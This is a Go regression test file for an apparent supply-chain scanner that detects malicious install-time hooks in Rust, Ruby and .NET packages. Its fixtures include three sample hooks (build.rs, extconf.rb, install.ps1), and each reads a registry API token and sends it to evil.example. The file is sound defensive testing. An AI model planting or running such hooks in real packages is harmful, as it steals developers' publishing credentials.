package instsurf_test

// Decision D-26 regression corpus.
//
// A real recursive scan of an adversarial fixture set proved that cargo, gem,
// and nuget resolved their dependency trees but never looked at install-time
// code: AnalyzeRust / AnalyzeRuby / AnalyzeDotNet existed but no adapter called
// them. Two planted fixtures (a build.rs exfil and an extconf.rb payload)
// sailed through with zero findings — a false all-clear, the one outcome this
// tool treats as unacceptable.
//
// These tests wire each of the three ecosystems end-to-end (source on disk ->
// ExtractInstallSurface -> VC-002 family) and assert both directions: a
// credential-plus-network hook BLOCKS, and an ordinary build script stays
// silent so the fix does not become a tax on every native package.

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/check"
	"ihbv.io/depsnort/internal/check/builtin"
	"ihbv.io/depsnort/internal/ecosystem"
	"ihbv.io/depsnort/internal/ecosystem/cargo"
	"ihbv.io/depsnort/internal/ecosystem/nuget"
	"ihbv.io/depsnort/internal/ecosystem/rubygems"
	"ihbv.io/depsnort/internal/graph"
)

// runVC002 runs the capability-driven VC-002 family and tallies findings by ID.
func runVC002(g *graph.Graph) map[string]int {
	ctx := &check.Context{Graph: g}
	counts := map[string]int{}
	for _, c := range []check.Check{
		builtin.HookNetwork{},      // VC-002b
		builtin.HookCredentials{},  // VC-002c
		builtin.HookExfilCapable{}, // VC-002d (block)
		builtin.HookObfuscated{},   // VC-002e
	} {
		for _, f := range c.Run(ctx) {
			counts[f.CheckID]++
		}
	}
	return counts
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// gemRoot / nugetRoot build a one-node rooted graph for an ecosystem whose
// lockfile parser is exercised by its own adapter tests; here we isolate the
// install-surface wiring the new code adds.
func rootedGraph(eco, name, ver string) *graph.Graph {
	g := graph.New()
	id := "pkg:" + eco + "/" + name + "@" + ver
	g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: eco, Name: name, Version: ver, Depth: 0})
	g.MarkRoot(id)
	return g
}

func TestCargoBuildRsExfilBlocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "Cargo.lock"),
		"[[package]]\nname = \"evil-crate\"\nversion = \"0.1.0\"\n")
	write(t, filepath.Join(dir, "build.rs"), `
use std::env;
fn main() {
    let token = env::var("CARGO_REGISTRY_TOKEN").unwrap();
    let _ = reqwest::blocking::get("https://evil.example/collect").unwrap();
    let _ = token;
}
`)
	g, err := cargo.New().Resolve(dir)
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}
	// The adapter must satisfy the interface — this is the wiring that was missing.
	ex, ok := ecosystem.Adapter(cargo.New()).(ecosystem.InstallSurfaceExtractor)
	if !ok {
		t.Fatal("cargo adapter does not implement InstallSurfaceExtractor")
	}
	if err := ex.ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("build.rs reading a registry token and reaching the network must BLOCK (VC-002d); got %v", c)
	}
}

func TestCargoOrdinaryBuildRsSilent(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "Cargo.lock"),
		"[[package]]\nname = \"honest-crate\"\nversion = \"0.1.0\"\n")
	write(t, filepath.Join(dir, "build.rs"),
		"fn main() { println!(\"cargo:rustc-link-lib=z\"); }\n")
	g, err := cargo.New().Resolve(dir)
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}
	_ = cargo.New().ExtractInstallSurface(dir, g)
	if c := runVC002(g); len(c) != 0 {
		t.Errorf("an ordinary build.rs must not fire any VC-002 finding; got %v", c)
	}
}

func TestGemExtconfPayloadBlocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "ext", "evilgem", "extconf.rb"), `
require 'net/http'
key = ENV['GEM_HOST_API_KEY']
Net::HTTP.post(URI('https://evil.example/c'), key)
`)
	g := rootedGraph("gem", "evilgem", "0.1.0")
	if err := rubygems.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("extconf.rb reading GEM_HOST_API_KEY and reaching the network must BLOCK; got %v", c)
	}
}

func TestNuGetInstallPs1Blocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "install.ps1"), `
$key = $env:NUGET_API_KEY
Invoke-WebRequest -Uri "https://evil.example/c" -Body $key
`)
	g := rootedGraph("nuget", "evilpkg", "1.0.0")
	if err := nuget.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("install.ps1 reading NUGET_API_KEY and reaching the network must BLOCK; got %v", c)
	}
}
